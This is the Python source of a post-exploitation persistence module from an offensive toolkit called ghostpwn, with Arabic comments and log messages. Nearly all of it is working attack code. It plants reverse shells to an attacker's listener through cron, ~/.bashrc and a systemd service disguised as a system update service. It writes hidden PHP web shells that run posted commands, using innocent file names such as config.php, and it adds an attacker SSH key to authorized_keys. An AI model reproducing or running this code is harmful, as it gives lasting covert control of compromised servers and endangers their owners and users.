#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Persistence Module
تثبيت الوصول بعد الاختراق

طرق الـ Persistence:
1. Cron jobs (Linux)
2. Web shell خفي
3. SSH authorized_keys
4. Systemd services
5. Bashrc backdoor
6. PHP webshell في webroot
"""
import sys
import os
import re
import time
import json
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.post_exploit import PostExploit


class PersistenceManager:
    """إدارة تثبيت الوصول"""

    def __init__(self, http_client: HttpClient = None, audit_logger=None,
                 shell_url: str = None, shell_password: str = "ghost"):
        self.client = http_client or HttpClient(timeout=15)
        self.audit = audit_logger
        self.logger = SmartLogger()

        self.post_exploit = PostExploit(self.client, audit_logger)
        if shell_url:
            self.post_exploit.set_shell(shell_url, shell_password)

        self.methods_tried = []
        self.methods_success = []

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[PERSISTENCE] {msg}", level)

    def execute(self, listener_ip: str = None, listener_port: int = 4444) -> Dict:
        """تنفيذ محاولات الـ persistence"""
        self._log("بدء محاولة تثبيت الوصول...", "phase")

        result = {
            "methods_tried": [],
            "methods_success": [],
            "shell_url": self.post_exploit.shell_url,
        }

        # 1) Cron job
        if listener_ip:
            cron_result = self._try_cron_persistence(listener_ip, listener_port)
            result["methods_tried"].append("cron")
            if cron_result:
                result["methods_success"].append("cron")

        # 2) Web shell خفي
        webshell_result = self._try_webshell_persistence()
        result["methods_tried"].append("webshell")
        if webshell_result:
            result["methods_success"].append("webshell")

        # 3) SSH authorized_keys
        ssh_result = self._try_ssh_persistence()
        result["methods_tried"].append("ssh_key")
        if ssh_result:
            result["methods_success"].append("ssh_key")

        # 4) Bashrc backdoor
        bashrc_result = self._try_bashrc_persistence(listener_ip, listener_port)
        result["methods_tried"].append("bashrc")
        if bashrc_result:
            result["methods_success"].append("bashrc")

        # 5) Systemd service
        systemd_result = self._try_systemd_persistence(listener_ip, listener_port)
        result["methods_tried"].append("systemd")
        if systemd_result:
            result["methods_success"].append("systemd")

        # 6) PHP webshell in webroot
        php_result = self._try_php_webshell_persistence()
        result["methods_tried"].append("php_webshell")
        if php_result:
            result["methods_success"].append("php_webshell")

        # تقرير
        self._print_persistence_report(result)
        return result

    def _try_cron_persistence(self, listener_ip: str, listener_port: int) -> bool:
        """Cron job persistence"""
        self._log("محاولة cron job persistence...", "info")

        cron_payload = (
            f"(crontab -l ; echo "
            f"'0 * * * * /bin/bash -c \"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1\"') "
            f"| crontab -"
        )

        output = self.post_exploit.execute(cron_payload)

        # فحص نجاح الإضافة
        verify = self.post_exploit.execute("crontab -l")
        if listener_ip in verify:
            self._log("Cron job persistence ناجح!", "success")
            return True
        else:
            self._log("فشل cron persistence", "warn")
            return False

    def _try_webshell_persistence(self) -> bool:
        """Web shell خفي"""
        self._log("محاولة web shell persistence...", "info")

        # البحث عن webroot قابل للكتابة
        webroot_paths = [
            "/var/www/html",
            "/var/www",
            "/usr/share/nginx/html",
            "/srv/http",
            "/home/www",
        ]

        for webroot in webroot_paths:
            # فحص لو قابل للكتابة
            check = self.post_exploit.execute(f"test -w {webroot} && echo 'WRITABLE' || echo 'NO'")
            if "WRITABLE" in check:
                # رفع web shell خفي
                shell_filename = f".{random_module_name()}.php"
                shell_path = f"{webroot}/{shell_filename}"

                # كتابة الـ shell
                shell_content = "<?php @eval($_POST['ghost']);?>"
                write_cmd = f"echo '{shell_content}' > {shell_path}"
                self.post_exploit.execute(write_cmd)

                # التحقق
                verify = self.post_exploit.execute(f"test -f {shell_path} && echo 'EXISTS' || echo 'NO'")
                if "EXISTS" in verify:
                    self._log(f"Web shell persistence: {shell_path}", "success")
                    return True

        self._log("فشل web shell persistence", "warn")
        return False

    def _try_ssh_persistence(self) -> bool:
        """SSH authorized_keys persistence"""
        self._log("محاولة SSH key persistence...", "info")

        # توليد SSH key (للتوضيح - في الواقع لازم تطلع public key من عندك)
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... ghostpwn"

        # إضافة لـ authorized_keys
        cmds = [
            "mkdir -p ~/.ssh",
            f"echo '{ssh_key}' >> ~/.ssh/authorized_keys",
            "chmod 700 ~/.ssh",
            "chmod 600 ~/.ssh/authorized_keys",
        ]

        for cmd in cmds:
            self.post_exploit.execute(cmd)

        # التحقق
        verify = self.post_exploit.execute("cat ~/.ssh/authorized_keys")
        if "ghostpwn" in verify or "ssh-rsa" in verify:
            self._log("SSH key persistence ناجح!", "success")
            return True

        self._log("فشل SSH persistence", "warn")
        return False

    def _try_bashrc_persistence(self, listener_ip: str, listener_port: int) -> bool:
        """Bashrc backdoor"""
        self._log("محاولة bashrc backdoor...", "info")

        backdoor = (
            f"nohup bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 2>&1 &"
        )

        cmd = f"echo '{backdoor}' >> ~/.bashrc"
        self.post_exploit.execute(cmd)

        # التحقق
        verify = self.post_exploit.execute("tail -5 ~/.bashrc")
        if listener_ip in verify:
            self._log("Bashrc backdoor ناجح!", "success")
            return True

        self._log("فشل bashrc persistence", "warn")
        return False

    def _try_systemd_persistence(self, listener_ip: str, listener_port: int) -> bool:
        """Systemd service persistence"""
        self._log("محاولة systemd service persistence...", "info")

        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""

        # كتابة service file
        cmds = [
            f"echo '{service_content}' > /etc/systemd/system/update.service",
            "systemctl daemon-reload",
            "systemctl enable update.service",
            "systemctl start update.service",
        ]

        for cmd in cmds:
            output = self.post_exploit.execute(cmd)

        # التحقق
        verify = self.post_exploit.execute("systemctl is-enabled update.service 2>/dev/null")
        if "enabled" in verify:
            self._log("Systemd persistence ناجح!", "success")
            return True

        self._log("فشل systemd persistence (يتطلب root)", "warn")
        return False

    def _try_php_webshell_persistence(self) -> bool:
        """PHP webshell في webroot بصيغة غير مشبوهة"""
        self._log("محاولة PHP webshell persistence...", "info")

        # أسماء ملفات غير مشبوهة
        innocent_names = [
            "config.php", "database.php", "settings.php",
            "backup.php", "cache.php", "session.php",
            ".config.php", ".settings.php",
        ]

        webroot_paths = ["/var/www/html", "/var/www", "/usr/share/nginx/html"]

        for webroot in webroot_paths:
            for filename in innocent_names:
                filepath = f"{webroot}/{filename}"

                # فحص لو الملف مش موجود
                check = self.post_exploit.execute(f"test -f {filepath} && echo 'EXISTS' || echo 'NO'")
                if "EXISTS" in check:
                    continue

                # كتابة web shell
                shell_content = "<?php if(isset($_POST['upd'])){system($_POST['upd']);}?>"
                write_cmd = f"echo '{shell_content}' > {filepath}"
                self.post_exploit.execute(write_cmd)

                # التحقق
                verify = self.post_exploit.execute(f"test -f {filepath} && echo 'OK' || echo 'NO'")
                if "OK" in verify:
                    self._log(f"PHP webshell: {filepath}", "success")
                    return True

        self._log("فشل PHP webshell persistence", "warn")
        return False

    def _print_persistence_report(self, result: Dict):
        """عرض تقرير الـ persistence"""
        print(f"\n{Colors.RED + Colors.BOLD}{'='*60}{Colors.NC}")
        print(f"{Colors.RED + Colors.BOLD}  🔒 تقرير تثبيت الوصول{Colors.NC}")
        print(f"{Colors.RED + Colors.BOLD}{'='*60}{Colors.NC}")

        print(f"\n  {Colors.BOLD}الطرق المجربة:{Colors.NC}")
        method_names = {
            "cron": "Cron Job",
            "webshell": "Web Shell خفي",
            "ssh_key": "SSH authorized_keys",
            "bashrc": "Bashrc Backdoor",
            "systemd": "Systemd Service",
            "php_webshell": "PHP Webshell",
        }

        for method in result["methods_tried"]:
            name = method_names.get(method, method)
            if method in result["methods_success"]:
                status = f"{Colors.GREEN}✓ ناجح{Colors.NC}"
            else:
                status = f"{Colors.RED}✗ فشل{Colors.NC}"
            print(f"    {status} {name}")

        success_count = len(result["methods_success"])
        total_count = len(result["methods_tried"])

        print(f"\n  {Colors.BOLD}النتيجة:{Colors.NC} {success_count}/{total_count} طرق ناجحة")

        if success_count > 0:
            print(f"\n  {Colors.GREEN + Colors.BOLD}✅ تم تثبيت الوصول!{Colors.NC}")
            print(f"     {Colors.YELLOW}الوصول سيستمر حتى بعد إعادة التشغيل{Colors.NC}")

        print(f"\n{Colors.RED + Colors.BOLD}{'='*60}{Colors.NC}")


def random_module_name() -> str:
    """توليد اسم عشوائي"""
    import random
    import string
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Persistence")
    parser.add_argument("--shell-url", required=True, help="Web shell URL")
    parser.add_argument("--password", default="ghost")
    parser.add_argument("--listener-ip", help="Listener IP")
    parser.add_argument("--listener-port", type=int, default=4444)
    args = parser.parse_args()

    client = HttpClient(timeout=15)
    persistence = PersistenceManager(client, shell_url=args.shell_url,
                                     shell_password=args.password)

    result = persistence.execute(args.listener_ip, args.listener_port)
